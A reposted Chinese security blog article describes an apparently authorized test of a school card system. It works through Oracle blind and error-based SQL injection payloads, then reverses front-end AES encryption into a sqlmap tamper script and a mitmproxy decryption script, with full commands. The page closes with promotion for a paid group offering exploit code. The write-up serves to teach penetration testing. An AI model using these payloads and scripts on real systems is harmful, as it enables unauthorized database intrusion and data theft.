> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493289&idx=1&sn=509a7832c1e142e21af0c2e8e0428dd0

#  【js逆向】AES加密下的SQL注入  
0x1eeA  神农Sec   2025-07-15 03:30  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠券）。  
#   
  
文章作者：0x1eeA  
  
文章来源：https://www.freebuf.com/articles/web/423701.html  
  
  
**AES加密下的SQL注入**  
  
## 一.引子  

```
平平无奇的周三,小雷同学又接到了任务测试某校xx系统。
```

## 二.特征盲注  
  
拿着甲方爸爸给的账号密码直接登录该校一卡通系统,一番查找后点进了"丢卡查询"功能点。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoxB9dWxfpicQo5upFZVC1CtoGXYbBeNmPbrqnr3yj0q7PNpTebbKwP9w/640?wx_fmt=png&from=appmsg "")  
  
  
里面只有一个功能点看是来是查询丢失的卡。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoS2nBSSYSSNRo2pReM8Hr1x9LRFBGcxxwcicewdfghKfcV9Ly77h5czg/640?wx_fmt=png&from=appmsg "")  
  
  
直接单引号,查询。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoTQC8Cr7BicV2B2GdCA4JApjyqFXDLVtfYfPV1ibowEYq6AKkqhia3BFjQ/640?wx_fmt=png&from=appmsg "")  
  
  
咦?有说法啊,看看两个单引号。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoQbLcjiaAkK1ibdIxqYPrtU86iaicj9JztmGn19lllc7Zwwibiac45qRhiaE5A/640?wx_fmt=png&from=appmsg "")  
  
  
没报错,九成存在注入。抓个包看看啥情况  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKojFpScypnjqDJzh8dk4s4ZQOcNNCkiccOrywbNkZW5U38REC2nibW0Zlg/640?wx_fmt=png&from=appmsg "")  
  
  
wtf??? 下班  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovsCTuGWLTON0EQYbLcdmMZd6Opz9WAribp0K8LoiaYE6pvDIN3K3ibblg/640?wx_fmt=png&from=appmsg "")  
  
  
开个玩笑,下班是不可能的,虽然小雷不太懂js逆向,但是小雷精通SQL注入啊,先前不是有个报错吗,直接用报错的这个特征来注出数据来。  
  
根据刚刚的报错,小雷已经确认该处是单引号闭合,构造payload  
  

```
1'and 1=1/1 and'1'='1
```

  
正常无报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoqOibnCuibWvTkLOc0ThXoETVC23e7Lw3h0WIHQ3F1OjhklQoviaQfjsBA/640?wx_fmt=png&from=appmsg "")  
  
  

```
1'and 1=1/0 and'1'='1
```

  
报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoZOGTV7ywibia8PITrhTyFJ8XPbsH3JPRdkY06xnz9icf8Za7BtH57oqaw/640?wx_fmt=png&from=appmsg "")  
  
  
这是因为在一些数据库(例如某些版本的oracle)中0不能作为分母  
  
根据这个特性,直接注入出当前数据库用户的用户名长度  
  

```
1'and 1=1/(n-length(user)) and'1'='1
```

  
  
从1到10不断尝试n的值，直到报错为止。  
  
最终确定用户名长度为6  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKo4ajBVuSz8icUia40LR22Nibsg4ibrg3SIothKX09KIrGJb5cQDXxNuaMug/640?wx_fmt=png&from=appmsg "")  
  
  
下班!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoHnY3wlick4AHR57TQrAT7N6yGFbuczmJ3BNiaiabLcUcQlQbdlncr3Hmg/640?wx_fmt=png&from=appmsg "")  
  
![1741223005_67c8f45db5dffdc8321f4.png!small?1741223006144](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovGryiaicJr8QYdCvjnhutxl36TFfKj9VF0n4oKsjXe2BOIg4Y4AIK6JQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
很好,你成功引起了我小雷的注意。  
## 三.js逆向  

```
本来还想低调点,这下好了,不装了,其实我小雷会js逆向。&#34;王师傅,助我!&#34;
王师傅上线,接下来由我阿王来进行js逆向。
```

  
首先王师傅先使用该接口搜索123456,然后抓包 data就是我们提交的数据被加密后的样子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKojcnD4L3htbGPticJ6h37cEiaBswfmP12331qQf1oxWicbMjTulibx8GBUA/640?wx_fmt=png&from=appmsg "")  
  
  
查看抓到的包路径
```
xxxx/InvokFront
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKojrMo1yyjhicMia9ria3Ficdl0ZfqibmiakicsiaBSznFibZTsGmyWQ64nsNB8zg/640?wx_fmt=png&from=appmsg "")  
  
  
f12,选择Sources -> XHR/fetch Breakpoints 点击旁边的加号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKocclsC5Fr3N8aYqiaiadoYkibUMs1ZUNljXK12f2admnKweOBXrov7ANdw/640?wx_fmt=png&from=appmsg "")  
  
  
将刚刚的路径
```
xxxx/InvokFront
```

  
添加进去  
  
然后再去搜索123456，断点已经打成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKopx7bZp1VhuMwezG8lC0thlnEyDLwO4UzqeCHgtGD9ZRqMP5fKBvV7A/640?wx_fmt=png&from=appmsg "")  
  
  
点这个位置,让js代码一步步往下走  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoh8d0eEX2BhL7wA11uUBWSD8NE78OtibSeU93d9icEbyxzoQqvbm1ib8iaw/640?wx_fmt=png&from=appmsg "")  
  
  
直到看到这行代码,跳进函数里  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoAoThKjMFCOafD3JKpaYyTBMC34ODG3Jq0QgyWWlicicHIEOK4U1jp06Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoBeBHzTq6ecKGUeaibZSsLCnFvEVicRE82YuseobEOFaYicvyAj1MMz84w/640?wx_fmt=png&from=appmsg "")  
  
  
现在就很明确了,aes加密,且密钥等关键信息已经拿到  
  
打开WT-JS,把获取到的信息填写上去  
  
取消掉刚刚添加的断点,再次搜索123456,burp抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKob8PA3Qc2IBCYdIRsj6fKDMgvrusAmzv4DK1jKTKfQA5siavzCEnnicXw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKo5jh47ZFVa4OpZogicjEU9ZHiapx3n3gdIicH6icNY07Dj2ya8Ks1UENoSw/640?wx_fmt=png&from=appmsg "")  
  
  
取data数据  

```
O7WeIo4dKQNbjvwuCQ36n0nsfFNI5yw8%2FNrL6rRt7IfseaukPMboSa%2FCNr7Gq%2FiPJHhQho%2F4hj0a9kYUfyZJXGUAogehHFm5wO456u11NbX1KtOrngfCRcca%2B6YYKDt3QFboIljxopi9GS5Dxr5UaD6Z1OMH0WY4z1Zz3m5L8SoKfOdzpowFV6fBy4FXFXrrOIu%2BlP8DGY1jeW6t%2Fn8rTy4P7vQp3qz%2BGYn7%2BAzlXfRQynwDEOcEJrQ2GiVZ4Yfw
```

  
这个数据一看就是url编码过,解一下码  

```
O7WeIo4dKQNbjvwuCQ36n0nsfFNI5yw8/NrL6rRt7IfseaukPMboSa/CNr7Gq/iPJHhQho/4hj0a9kYUfyZJXGUAogehHFm5wO456u11NbX1KtOrngfCRcca+6YYKDt3QFboIljxopi9GS5Dxr5UaD6Z1OMH0WY4z1Zz3m5L8SoKfOdzpowFV6fBy4FXFXrrOIu+lP8DGY1jeW6t/n8rTy4P7vQp3qz+GYn7+AzlXfRQynwDEOcEJrQ2GiVZ4Yfw
```

  
然后解密  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoV10wNMx9CzQUtxicgVWjjibdDEMicyMna6XBxXV41bqOXCHcAia3pk39fg/640?wx_fmt=png&from=appmsg "")  
  
  
逆向出来了,接下来就该写python脚本了  

```
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# AES配置参数
KEY = 'xxxxxxx'.encode('utf-8')  # 16字节密钥
MODE = AES.MODE_ECB
BLOCK_SIZE = 16  # AES块大小固定为16字节
PADDING = 'pkcs7'  # 实际使用pkcs7填充标准


# 加密函数
def encrypt(plaintext):
    # 将明文转换为字节并填充
    data = pad(plaintext.encode('utf-8'), BLOCK_SIZE)
    # 创建AES加密器
    cipher = AES.new(KEY, MODE)
    # 执行加密
    encrypted = cipher.encrypt(data)
    # 返回Base64编码字符串
    return base64.b64encode(encrypted).decode('utf-8')

# 解密函数
def decrypt(ciphertext):
    # Base64解码
    encrypted = base64.b64decode(ciphertext)
    # 创建AES解密器
    cipher = AES.new(KEY, MODE)
    # 执行解密并去除填充
    decrypted = unpad(cipher.decrypt(encrypted), BLOCK_SIZE)
    # 转换为字符串返回
    return decrypted.decode('utf-8')
```

  
先写出加解密函数,后面写tamper更方便  
  
## 四.tamper脚本编写  

```
其实思路很简单
1.给data的值填为*,标记为注入点,让data参数接受sqlmap的payload
2.通过tamper脚本将data的值改为系统固定的json数据+aes加密
```

  
直接根据上面的python脚本中的加密函数搞一个tamper脚本  

```
#!/usr/bin/env python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    # 将data参数修改为系统固定的json格式后aes加密
    vay1 = '''{&#34;method&#34;:&#34;CampusCard&#34;,&#34;param&#34;:&#34;{\\&#34;pagenumber\\&#34;:1,\\&#34;pagesize\\&#34;:10,\\&#34;outid\\&#34;:\\&#34;'''
    vay2 = '''\\&#34;,\\&#34;command\\&#34;:\\&#34;xxx\\&#34;}&#34;,&#34;schoolid&#34;:&#34;1&#34;,&#34;token&#34;:&#34;xxx&#34;}'''
    payload = encrypt(vay1 + payload + vay2)
    return payload


# aes加密函数
def encrypt(plaintext):
    # AES配置参数
    KEY = 'xxxxxxx'.encode('utf-8')  # 16字节密钥
    MODE = AES.MODE_ECB
    BLOCK_SIZE = 16  # AES块大小固定为16字节
    PADDING = 'pkcs7'  # 实际使用pkcs7填充标准
    # 将明文转换为字节并填充
    data = pad(plaintext.encode('utf-8'), BLOCK_SIZE)
    # 创建AES加密器
    cipher = AES.new(KEY, MODE)
    # 执行加密
    encrypted = cipher.encrypt(data)
    # 返回Base64编码字符串
    return base64.b64encode(encrypted).decode('utf-8')
```

  
直接slqmap:  
  

```
python sqlmap.py -r url.txt --tamper aes_test.py –ignore-code=500 --level 5 
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKo603e9ax9auP7f18TcodibmEOzm9httfNoPXIncWcyNhyMO1brqYHuEQ/640?wx_fmt=png&from=appmsg "")  
  
  
没跑出来,直接各种打印调试脚本,最后发现: 压根不是tamper脚本的问题  
  
![1741223504_67c8f65007f4e6f04bd68.png!small?1741223504682](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoaDWOCrdEnB41CP1bsPPTdOLnwwFhhl8icm8yq055sgKiaGQGMaUf5lWg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
返回原始请求包发现,response的数据也是被加密过的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKooxrlm1WYibSzOH4OGQAFgXFFUvAA3icxKFJuZfQopCF6RHsicHZ1W7LzQ/640?wx_fmt=png&from=appmsg "")  
  
  
现在需要在原先的思路上做一些改变  
  

```
1.给data的值填为*,标记为注入点,让data参数接受sqlmap的payload
2.通过tamper脚本将data的值改为系统固定的json数据+aes加密
3.通过mitmproxy拦截sqlmap请求url后的response,解密response_data后重新发给sqlmap
4.sqlmap通过mitmproxy处理过的response_data来判断漏洞是否存在

mitmproxy是基于Python的中间人代理工具，通过拦截、检查和修改HTTP(S)流量实现以下核心功能：
  透明代理：终端设备无需安装证书即可解密HTTPS（需配置代理）
  流量镜像：实时展示请求/响应内容（支持Web/命令行界面）
  流量篡改：通过Python脚本动态修改报文内容
  抓包存储：保存会话记录为.flow文件供后续分析
简单来说我们可以通过mitmproxy拦截sqlmap发送网络请求后的返回包,并修改返回包的数据
```

  
编写decrypt_proxy.py  

```
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = 'xxxxxxx'.encode('utf-8')
MODE = AES.MODE_ECB
BLOCK_SIZE = 16

# 解密函数
def decrypt(ciphertext):
    try:
        print(f&#34;\n[解密开始] 密文长度:{len(ciphertext)} 前20字符:{ciphertext[:20]}...&#34;)

        encrypted = base64.b64decode(ciphertext)
        cipher = AES.new(KEY, MODE)
        decrypted_padded = cipher.decrypt(encrypted)
        plaintext = unpad(decrypted_padded, BLOCK_SIZE).decode('utf-8')
        return plaintext
    except Exception as e:
        print(f&#34;[解密失败] 错误类型:{type(e).__name__} 原因:{str(e)}&#34;)
        return ciphertext


def response(flow):
    # 判断response的content-type类型是否为json
    if 'application/json' in flow.response.headers.get('content-type', ''):
        try:
            data = json.loads(flow.response.text)
            if 'resultdata' in data:
                # 取键'resultdata'对应的值进行解密
                data = decrypt(data['resultdata'])
                print(f&#34;[解密成功] 明文长度:{len(data)}&#34;)
                # 打印解密后的数据
                plaintext_preview = data[:200].replace('\n', '')
                print(f&#34;|—— 前200字符预览: {plaintext_preview}...&#34;)
                # 将解密后的数据重新赋给response_data
                flow.response.text = data
        except Exception:
            pass

```

  
通过命令启动mitmproxy脚本  

```
# 指定拦截8080端口  忽略ssl证书
mitmdump -s decrypt_proxy.py -p 8080 --ssl-insecure
```

  
sqlmap  

```
# 代理端口和mitmproxy同步
python sqlmap.py -r url.txt --tamper aes_test.py --proxy=http://localhost:8080 –ignore-code=500 --level 5 --risk 1
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKoCGfAY0icnwtu58Fx5ZMWwqcdkrQsibLfibVqiaIQXkLg8u71OwZgDwZ9mQ/640?wx_fmt=png&from=appmsg "")  
  
  
sqlmap跑出来一个报错注入,王师傅来手动验证下  

```
') WHERE 1550=1550 AND 6051=CTXSYS.DRITHSX.SN(6051,(CHR(113)||CHR(106)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (6051=6051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(122)||CHR(113)))-- Uqfv﻿
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKowg9ichib5z0R6ssJVMNnLf7j3WNLNUoibFxKvbU050cUZQkkf5khiax7bQ/640?wx_fmt=png&from=appmsg "")  
  
  
拿到response,解密一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKou0DQ7iaCI9jI2f18mApibo3yNxrqEpJvmhdsia8VCPHjHyPWYLzIQhjKA/640?wx_fmt=png&from=appmsg "")  
  
aes加密下的SQL注入漏洞成功实现sqlmap自动化注入  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1000人 45元/年  
  
星球人数少于1200人 65元/年  
  
（新人优惠券20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKogHTNRKIZQVcM0QQE3wbFrFciafzrEaRcia7gkRFb4vujBubqic3sPIN1g/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满1000人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovBgx57dc6Ql2yRSPBJGA5fde4sQJzOomD1GURVibZeCNzXM6iaGrSe8Q/640?wx_fmt=jpeg&from=appmsg "")  

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
